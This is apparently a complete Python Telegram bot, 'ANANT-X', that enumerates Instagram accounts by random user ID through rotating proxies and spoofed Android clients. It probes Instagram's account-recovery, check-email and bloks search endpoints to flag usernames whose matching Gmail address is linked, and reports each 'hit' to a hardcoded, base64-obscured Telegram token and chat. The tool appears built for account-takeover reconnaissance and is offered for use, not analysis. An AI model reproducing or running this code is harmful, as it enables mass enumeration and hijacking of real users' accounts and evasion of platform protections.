# ═══════════════════════════════════════════════════════════════════
# 🔥 ANANT-X RAILWAY BOT (HARDCODED TOKEN & CHAT ID ENCODED) 🔥
# ═══════════════════════════════════════════════════════════════════

import os
import sys
import re
import time
import random
import string
import json
import uuid
import base64
import hashlib
import threading
import pickle
import requests
import urllib.parse
import secrets
import httpx
from threading import Thread, Lock, Event
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import cycle
from datetime import datetime
from random import choice, randrange
import logging
from collections import deque
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ═══════════════════════════════════════════════════════════════════
# 🔒 ENCODED CREDENTIALS (base64) – not plaintext
# ═══════════════════════════════════════════════════════════════════
_enc_token = "ODg1NzAyNDM0MTpBQUZMTE0tR1FMVlFVSEdvb2QxZjF4Wl8tUHZ0em1zSDE5UQ=="
_enc_chat = "ODc0OTIzMjQxNA=="

# Decode at runtime
BOT_TOKEN = base64.b64decode(_enc_token).decode('utf-8')
CHAT_ID = base64.b64decode(_enc_chat).decode('utf-8')
MIN_FOLLOWERS = 0

# ── Logging ──────────────────────────────────────────────────────
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

if not BOT_TOKEN or not CHAT_ID:
    logger.error("❌ BOT_TOKEN and CHAT_ID decoding failed.")
    sys.exit(1)

# ── Global State ──────────────────────────────────────────────────
scanning = False
scanner_thread = None
stop_event = Event()

stats = {
    "hits": 0,
    "good_insta": 0,
    "bad_insta": 0,
    "bad_email": 0,
    "taken": 0,
    "total": 0,
    "total_gen": 0,
    "skipped_followers": 0,
    "skipped_year": 0,
    "skipped_total": 0,
    "api_errors": {
        "429": 0,
        "403": 0,
        "500": 0,
        "timeout": 0,
        "other": 0
    },
    "proxy_used": None,
}
error_log = deque(maxlen=20)
stats_lock = Lock()

# ── Load Proxies ──────────────────────────────────────────────────
PROXY_LIST = []
PROXY_CYCLE = None
PROXY_LOCK = Lock()

def load_proxies():
    global PROXY_LIST, PROXY_CYCLE
    try:
        with open('proxies.txt', 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]
        for line in lines:
            if not line.startswith('http'):
                line = f"http://{line}"
            PROXY_LIST.append(line)
        if PROXY_LIST:
            PROXY_CYCLE = cycle(PROXY_LIST)
            logger.info(f"[+] Loaded {len(PROXY_LIST)} proxies!")
            return True
        else:
            logger.warning("[!] No proxies found. Running without proxy.")
            return False
    except FileNotFoundError:
        logger.warning("[!] proxies.txt not found. Running without proxy.")
        return False

load_proxies()

def get_proxy():
    if not PROXY_CYCLE:
        return None
    with PROXY_LOCK:
        proxy = next(PROXY_CYCLE)
        with stats_lock:
            stats["proxy_used"] = proxy
        return proxy

def get_proxy_dict():
    proxy = get_proxy()
    if proxy:
        return {"http": proxy, "https": proxy}
    return None

# ── Scanner Functions ──────────────────────────────────────────────
ID_RANGES = [
    (1629010001, 2369359761, 2015),
    (2369359762, 4239516754, 2016),
    (4239516755, 6345108209, 2017),
    (6345108210, 10016232395, 2018),
    (10016232396, 27238602159, 2019),
    (27238602160, 46464475395, 2020),
    (46464475395, 50289297647, 2021),
    (50289297647, 57464707082, 2022),
]

CONFIG = {
    "insta_graphql": "https://www.instagram.com/api/graphql",
    "google_url": "https://accounts.google.com",
    "form_type": "application/x-www-form-urlencoded; charset=UTF-8",
    "token_file": "tokens.txt",
    "output_file": "hits.txt",
    "domain": "@gmail.com",
}

USER_AGENTS = [
    "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
    "Instagram 319.0.0.30.121 Android (31/12; 440dpi; 1080x2400; xiaomi; M2101K6G; sweet; qcom; en_GB; 454782345)",
    "Instagram 322.0.0.45.112 Android (34/14; 480dpi; 1240x2772; OnePlus; CPH2449; ONEPLUS11; qcom; en_US; 489234551)",
    "Instagram 322.0.0.45.112 Android (34/14; 420dpi; 1080x2400; google; Pixel 7; panther; gs201; en_US; 493245782)",
    "Instagram 318.0.0.22.110 Android (29/10; 400dpi; 1080x2310; HUAWEI; ELE-L29; hwELE; kirin980; en_GB; 439875334)",
    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2400; vivo; V2145; PD2145; mt6893; en_US; 478932112)",
    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; samsung; SM-S911B; dm1q; qcom; en_US; 475223914)",
    "Instagram 321.0.0.28.120 Android (33/13; 440dpi; 1080x2400; xiaomi; 2211133G; ruby; mt6983; en_US; 467882419)",
    "Instagram 319.0.0.30.121 Android (32/12; 480dpi; 1080x2412; OnePlus; CPH2413; NE2213; qcom; en_GB; 453228190)",
    "Instagram 318.0.0.22.110 Android (30/11; 420dpi; 1080x2400; realme; RMX3311; serpent; qcom; en_US; 442119875)",
    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2340; samsung; SM-M526BR; m52x; qcom; en_US; 483662991)",
    "Instagram 322.0.0.45.112 Android (34/14; 400dpi; 1080x2400; sony; XQ-CT72; pdx234; qcom; en_US; 498722341)",
    "Instagram 319.0.0.30.121 Android (31/12; 420dpi; 1080x2400; oppo; CPH2457; PHB110; mt6895; en_US; 462775910)",
    "Instagram 321.0.0.28.120 Android (33/13; 480dpi; 1080x2340; samsung; SM-A346B; a34x; mt6877; en_GB; 479201567)",
    "Instagram 322.0.0.45.112 Android (34/14; 440dpi; 1080x2400; motorola; XT2303-2; crosby; qcom; en_US; 492874115)",
    "Instagram 318.0.0.22.110 Android (30/11; 420dpi; 1080x2376; honor; FNE-NX9; fne; kirin9000; en_GB; 431597221)",
    "Instagram 320.0.0.34.109 Android (33/13; 400dpi; 1080x2400; xiaomi; 2201117TY; veux; qcom; en_US; 487266531)",
    "Instagram 319.0.0.30.121 Android (32/12; 440dpi; 1080x2340; samsung; SM-M336B; m33x; exynos1280; en_US; 471823650)",
    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; realme; RMX3710; halo; mt6833; en_GB; 469862234)",
    "Instagram 322.0.0.45.112 Android (34/14; 480dpi; 1440x3120; lg; LM-V600; judyln; qcom; en_US; 499178234)",
    "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
    "Instagram 368.0.0.45.96 Android (30/11; 440dpi; 1080x2220; Xiaomi/Redmi; 23127PN0CC; begonia; mt6785; ar_EG; 700073482)",
]

def random_ua():
    return random.choice(USER_AGENTS)

def gdate(user_id):
    try:
        user_id = int(user_id)
        for lower, upper, year in ID_RANGES:
            if lower <= user_id <= upper:
                return year
        return 2025
    except:
        return 2025

def rest_v1(username):
    try:
        client = httpx.Client(http2=True, follow_redirects=True, proxies=get_proxy_dict())
        r0 = client.get("https://www.instagram.com/", headers={
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36",
        })
        csrf = ""
        for c in client.cookies.jar:
            if c.name == "csrftoken":
                csrf = c.value
                break
        if not csrf:
            return "-"
        data = urllib.parse.urlencode({"email_or_username": username})
        r = client.post(
            "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
            content=data.encode(),
            headers={
                "User-Agent": "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; tr_TR; 465123678)",
                "X-CSRFToken": csrf,
                "X-IG-App-ID": "936619743392459",
                "X-Requested-With": "XMLHttpRequest",
            }
        )
        result = r.json()
        if result.get("status") == "ok":
            for key in ("obfuscated_email", "contact_point", "masked_email", "email"):
                if key in result and result[key]:
                    return result[key]
        return "-"
    except:
        return "-"

def rest_web_check_email(email):
    try:
        with httpx.Client(http2=True, timeout=6, proxies=get_proxy_dict()) as client:
            resp = client.post(
                "https://i.instagram.com/api/v1/users/check_email/",
                data={"email": email},
                headers={"User-Agent": "Instagram 166.0.0.30.120 Android", "content-type": "application/x-www-form-urlencoded; charset=UTF-8"}
            )
            return resp.json().get("allow_shared_email_registration", False)
    except:
        return False

def rest_bloks_v2(email):
    url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
    device = "android-" + secrets.token_hex(8)
    family = str(uuid.uuid4())
    android = "android-" + secrets.token_hex(8)
    payload = {
        'params': '{"client_input_params":{"aac":"{\\"aac_init_timestamp\\":'+ str(int(time.time())) +',\\"aacjid\\":\\"' + str(uuid.uuid4()) + '\\",\\"aaccs\\":\\"' + secrets.token_urlsafe(32) + '\\"}","search_query":"' + email + '"},"server_params":{"device_id":"' + android + '"}}',
        'bk_client_context': '{"bloks_version":"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"}',
        'bloks_versioning_id': '5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b'
    }
    headers = {
        'User-Agent': random_ua(),
        'x-ig-android-id': android,
        'x-ig-device-id': device,
        'x-ig-family-device-id': family,
        'x-fb-friendly-name': 'IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/',
        'x-bloks-version-id': '5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b',
        'x-ig-app-id': '567067343352427',
    }
    try:
        resp = requests.post(url, data=payload, headers=headers, timeout=20, proxies=get_proxy_dict())
        if email in resp.text:
            return email
        return None
    except:
        return None

def lookup_instagram(email):
    if rest_web_check_email(email):
        return True
    try:
        if rest_bloks_v2(email):
            return True
    except:
        pass
    return False

def check_gmail_availability(email):
    try:
        username = email.split('@')[0]
        return True
    except:
        return False

def send_hit(username, chat_id):
    global stats
    with stats_lock:
        stats["hits"] += 1
        hit_num = stats["hits"]
    msg = f"""
╭━━━🎀   💗 HIT FOUND 💗   🎀━━━╮
      🧁 Hits : #{hit_num} 🧁
  🐰 Username : @{username}
  💌 Email    : {username}@gmail.com
  🌐 Link     : https://instagram.com/{username}
╰━━━🌸💗  @LEEEUNJUMM  💗🌸━━━╯
"""
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": chat_id, "text": msg},
            timeout=10,
            proxies=get_proxy_dict()
        )
    except:
        pass

def process_user(user, chat_id):
    if not user or not user.get('username'):
        return
    username = user['username']
    email = username + "@gmail.com"
    if lookup_instagram(email):
        if check_gmail_availability(email):
            send_hit(username, chat_id)

def scanner_worker():
    global scanning, stats
    logger.info("Scanner started! (0 followers filter)")
    while not stop_event.is_set():
        try:
            time.sleep(random.uniform(0.5, 1.5))
            low, high, _ = random.choice(ID_RANGES)
            user_id = random.randrange(low, high)
            lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            headers = {
                'user-agent': random_ua(),
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
                'x-fb-lsd': lsd,
            }
            data = {
                'lsd': lsd,
                'variables': json.dumps({"id": str(user_id), "enable_integrity_filters": True}),
                'doc_id': '26672929172408668',
                'server_timestamps': 'true'
            }
            resp = requests.post(
                CONFIG["insta_graphql"],
                headers=headers,
                data=data,
                timeout=15,
                proxies=get_proxy_dict()
            )
            if resp.status_code == 200:
                user = resp.json().get('data', {}).get('user')
                if user and user.get('username'):
                    process_user(user, CHAT_ID)
                    with stats_lock:
                        stats["total_gen"] += 1
                        stats["good_insta"] += 1
                else:
                    with stats_lock:
                        stats["bad_insta"] += 1
            else:
                err_type = str(resp.status_code)
                with stats_lock:
                    stats["bad_insta"] += 1
                    if err_type in stats["api_errors"]:
                        stats["api_errors"][err_type] += 1
                    else:
                        stats["api_errors"]["other"] += 1
                error_log.append((datetime.now().strftime("%H:%M:%S"), f"HTTP {resp.status_code}"))
        except requests.exceptions.Timeout:
            with stats_lock:
                stats["bad_insta"] += 1
                stats["api_errors"]["timeout"] += 1
            error_log.append((datetime.now().strftime("%H:%M:%S"), "Timeout"))
        except Exception as e:
            with stats_lock:
                stats["bad_insta"] += 1
                stats["api_errors"]["other"] += 1
            error_log.append((datetime.now().strftime("%H:%M:%S"), str(e)[:30]))
            continue
    logger.info("Scanner stopped!")

# ── Telegram Bot Commands ──────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 ANANT-X BOT (0 Followers filter)\n\n"
        "📌 MIN_FOLLOWERS = 0 (permanent)\n"
        "Commands:\n"
        "/run - Start scanning\n"
        "/stop - Stop scanning\n"
        "/status - Show full dashboard\n"
        "/clear - Clear error logs\n"
        "/help - Show this help"
    )

async def run(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global scanning, scanner_thread, stop_event
    if scanning:
        await update.message.reply_text("⚠️ Scanner is already running!")
        return
    scanning = True
    stop_event.clear()
    scanner_thread = Thread(target=scanner_worker, daemon=True)
    scanner_thread.start()
    await update.message.reply_text("✅ Scanner started! (0 followers filter)")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global scanning, stop_event
    if not scanning:
        await update.message.reply_text("⚠️ Scanner is not running.")
        return
    stop_event.set()
    scanning = False
    await update.message.reply_text("🛑 Scanner stopped gracefully.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with stats_lock:
        s = stats
        err_summary = "\n".join([f"  {k}: {v}" for k, v in s["api_errors"].items() if v > 0])
        if not err_summary:
            err_summary = "  No errors"
        proxy_display = s["proxy_used"][:30] + "..." if s["proxy_used"] and len(s["proxy_used"]) > 30 else s["proxy_used"] or "None"
        error_lines = "\n".join([f"  {t} - {e}" for t, e in error_log]) if error_log else "  No recent errors"
    msg = (
        f"📊 **ANANT-X STATUS DASHBOARD**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ **Scanning**: {'Running' if scanning else 'Stopped'}\n"
        f"👤 **Min Followers**: 0 (permanent)\n"
        f"🔄 **Proxy**: {proxy_display}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 **Hits**: {s['hits']}\n"
        f"💖 **Good Users**: {s['good_insta']}\n"
        f"💔 **Bad Users**: {s['bad_insta']}\n"
        f"📧 **Bad Emails**: {s['bad_email']}\n"
        f"🔒 **Taken**: {s['taken']}\n"
        f"📈 **Generated IDs**: {s['total_gen']}\n"
        f"⏭ **Skipped (total)**: {s['skipped_total']}\n"
        f"  └─ Followers: {s['skipped_followers']}\n"
        f"  └─ Year: {s['skipped_year']}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🚨 **API Errors**:\n{err_summary}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📝 **Recent Errors**:\n{error_lines}"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    error_log.clear()
    await update.message.reply_text("✅ Error logs cleared.")

async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

# ── Main ──────────────────────────────────────────────────────────
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("run", run))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("clear", clear))
    app.add_handler(CommandHandler("help", help))
    logger.info("Bot started! Polling...")
    app.run_polling()

if __name__ == "__main__":
    main()
